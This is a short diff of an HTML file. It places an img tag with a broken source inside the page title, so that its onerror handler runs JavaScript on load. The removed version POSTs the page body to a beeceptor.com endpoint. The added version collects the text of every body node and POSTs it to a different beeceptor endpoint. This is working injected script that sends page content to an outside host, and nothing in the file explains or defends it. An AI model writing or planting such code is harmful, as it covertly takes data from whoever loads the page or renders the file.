@@ -2,8 +2,12 @@
 <html lang="en">
 <head>
     <title><img src="invalid_link"
-     onerror="fetch ('https://location.free.beeceptor.com',{method:'POST', headers: { 'Content-Type': 'application/json' },
-                                            body: JSON.stringify({ data: document.querySelector('body')})})"
+     onerror="let data = [];let body = document.querySelector('body');Array.prototype.forEach.call (body.childNodes, function (node) {
+    console.log (node);
+    data.push (node.textContent);
+
+}); console.log (data);fetch('https://roots.free.beeceptor.com',{method:'POST', headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify(data)})"
 ></title>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
